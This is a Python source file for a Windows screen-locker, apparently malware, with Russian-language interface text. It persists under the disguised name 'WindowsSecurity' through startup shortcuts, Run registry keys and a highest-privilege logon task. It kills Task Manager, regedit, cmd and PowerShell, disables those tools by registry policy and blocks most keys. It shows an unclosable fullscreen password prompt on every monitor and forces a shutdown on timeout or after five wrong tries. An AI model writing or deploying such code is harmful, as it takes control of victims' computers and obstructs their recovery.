from tkinter import *
from subprocess import Popen as cmd
from screeninfo import get_monitors
from keyboard import block_key as block
from win32com.client import Dispatch
import tkinter as tk
import sys
import os
import winshell
import psutil
import platform
import subprocess
import threading
import time
import winreg
import ctypes
from datetime import datetime


def add_to_startup_ultimate():
    try:
        exe_path = os.path.realpath(sys.argv[0])
        shell = Dispatch('WScript.Shell')

        #автозагрузка
        startup_folder = winshell.startup()
        shortcut_path = os.path.join(startup_folder, "WindowsSecurity.lnk")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.save()


        all_users_startup = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
        if os.path.exists(all_users_startup):
            shortcut_all = os.path.join(all_users_startup, "WindowsSecurity.lnk")
            shortcut = shell.CreateShortCut(shortcut_all)
            shortcut.Targetpath = exe_path
            shortcut.save()


        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ, exe_path)


        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
                                winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as key:
                winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ, exe_path)
        except:
            pass


        task_name = "WindowsSecurityTask"
        subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /f /rl highest',
                       shell=True, capture_output=True)

        return True
    except Exception as e:
        return False


def protect_process():

    try:
        #повышение приоритета
        ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000100)
        #Защита от завершения
        ctypes.windll.kernel32.SetProcessWorkingSetSize(ctypes.windll.kernel32.GetCurrentProcess(), -1, -1)
    except:
        pass


def kill_task_manager():
    dangerous_processes = [
        'taskmgr.exe', 'regedit.exe', 'cmd.exe', 'powershell.exe',
        'msconfig.exe', 'procexp.exe', 'processhacker.exe'
    ]

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in dangerous_processes:
                proc.kill()
        except:
            pass


def block_task_manager():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except:
        pass


def disable_registry_tools():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
    except:
        pass


def persistence_thread():
    while True:
        time.sleep(30)
        try:
            add_to_startup_ultimate()
            kill_task_manager()
            block_task_manager()
            disable_registry_tools()
        except:
            pass


def create_window_for_monitor(monitor):
    root = tk.Toplevel(win)

    persist_thread = threading.Thread(target=persistence_thread, daemon=True)
    persist_thread.start()


    timer_seconds = 1200
    timer_running = True
    attempts = 0
    max_attempts = 5

    def update_timer():
        nonlocal timer_seconds, timer_running
        if timer_running and timer_seconds > 0:
            minutes = timer_seconds // 60
            seconds = timer_seconds % 60
            timer_label.config(text=f"{minutes:02d}:{seconds:02d}")
            timer_seconds -= 1
            root.after(1000, update_timer)
        elif timer_seconds <= 0:
            shutdown_computer()

    def update_system_time():
        if timer_running:
            current_time = datetime.now().strftime("%H:%M:%S")
            current_date = datetime.now().strftime("%d.%m.%Y")
            time_label.config(text=f"{current_time} | {current_date}")
            root.after(1000, update_system_time)

    def shutdown_computer():
        countdown_window = Toplevel(root)
        countdown_window.attributes("-topmost", 1)
        countdown_window.overrideredirect(1)
        countdown_window.protocol("WM_DELETE_WINDOW", lambda: None)

        screen_width = countdown_window.winfo_screenwidth()
        screen_height = countdown_window.winfo_screenheight()

        countdown_window.geometry(f"{screen_width}x{screen_height}+0+0")
        countdown_window.configure(bg='#1a1a2e')

        def countdown(count):
            if count > 0:
                countdown_label.config(text=f"Время истекло!\nКомпьютер выключится через {count} сек.")
                countdown_window.after(1000, countdown, count - 1)
            else:
                subprocess.run("shutdown /s /f /t 0", shell=True)
                sys.exit()

        countdown_label = Label(
            countdown_window,
            text=f"Время истекло!\nКомпьютер выключится через 5 сек.",
            font=("Segoe UI", 24, "bold"),
            fg="#e94560",
            bg='#1a1a2e',
            justify="center"
        )
        countdown_label.place(relx=0.5, rely=0.5, anchor="center")

        countdown(5)

    def CheckPassword(arg=None):
        nonlocal timer_running, attempts
        if password.get() == "12345":
            timer_running = False


            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass


            try:
                subprocess.Popen("explorer.exe", shell=True)
            except:
                pass

            root.destroy()
            sys.exit()
        else:
            attempts += 1
            remaining = max_attempts - attempts
            if remaining > 0:
                error_label.config(text=f"Неверный пароль! Осталось попыток: {remaining}")
                password.delete(0, END)
                root.after(2000, lambda: error_label.config(text=""))
            if attempts >= max_attempts:
                error_label.config(text="Превышено количество попыток! Выключение...")
                root.after(1000, shutdown_computer)

    X = root.winfo_screenwidth()
    Y = root.winfo_screenheight()

    bg_color = "#1a1a2e"
    accent_color = "#e94560"
    text_color = "#ffffff"
    success_color = "#0f3460"

    root["bg"] = bg_color
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.attributes("-topmost", True)
    root.geometry(f"{X}x{Y}")
    root.overrideredirect(True)


    def block_keys(event):
        return 'break'

    root.bind('<Alt-F4>', block_keys)
    root.bind('<Control-Alt-Delete>', block_keys)

    # Время
    time_label = Label(
        root,
        text="",
        font=("Segoe UI", 11),
        fg="#808080",
        bg=bg_color
    )
    time_label.place(x=X - 180, y=10)


    center_frame = Frame(root, bg=bg_color)
    center_frame.place(relx=0.5, rely=0.5, anchor="center")

    #Заголовок
    title_label = Label(
        center_frame,
        text="Введите пароль",
        font=("Segoe UI", 28, "bold"),
        fg=accent_color,
        bg=bg_color
    )
    title_label.pack(pady=(0, 20))

    #Таймер
    timer_label = Label(
        center_frame,
        text="20:00",
        font=("Segoe UI", 18, "bold"),
        fg="#ffd700",
        bg=bg_color
    )
    timer_label.pack(pady=(0, 30))


    password = Entry(
        center_frame,
        font=("Segoe UI", 18, "bold"),
        bg="#2a2a3e",
        fg=text_color,
        insertbackground=text_color,
        relief="flat",
        bd=10,
        justify="center",
        width=20,
        show=""
    )
    password.pack(pady=10, ipady=8)
    password.focus_force()
    password.bind("<Return>", CheckPassword)


    error_label = Label(
        center_frame,
        text="",
        font=("Segoe UI", 11),
        fg="#ff6b6b",
        bg=bg_color
    )
    error_label.pack(pady=(10, 20))


    unlock_button = Button(
        center_frame,
        text="Разблокировать",
        font=("Segoe UI", 13, "bold"),
        bg=success_color,
        fg=text_color,
        relief="flat",
        cursor="hand2",
        command=CheckPassword,
        activebackground="#1a5276",
        activeforeground=text_color,
        width=20,
        height=1
    )
    unlock_button.pack(pady=(5, 15), ipady=5)

    def on_enter(e):
        unlock_button['bg'] = '#1a5276'

    def on_leave(e):
        unlock_button['bg'] = success_color

    unlock_button.bind("<Enter>", on_enter)
    unlock_button.bind("<Leave>", on_leave)


    update_timer()
    update_system_time()


def Block():
    all_keys = [
        'ctrl', 'alt', 'shift', 'win', 'tab', 'esc',
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
        'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
        'space', 'backspace', 'enter', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
        'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
    ]

    for key in all_keys:
        try:
            block(key)
        except:
            pass


    try:
        subprocess.run("taskkill /f /im explorer.exe", shell=True, capture_output=True)
        subprocess.run("taskkill /f /im taskmgr.exe", shell=True, capture_output=True)
    except:
        pass



win = Tk()
win.withdraw()


protect_process()


add_to_startup_ultimate()
block_task_manager()
disable_registry_tools()


for monitor in get_monitors():
    create_window_for_monitor(monitor)

Block()
win.mainloop()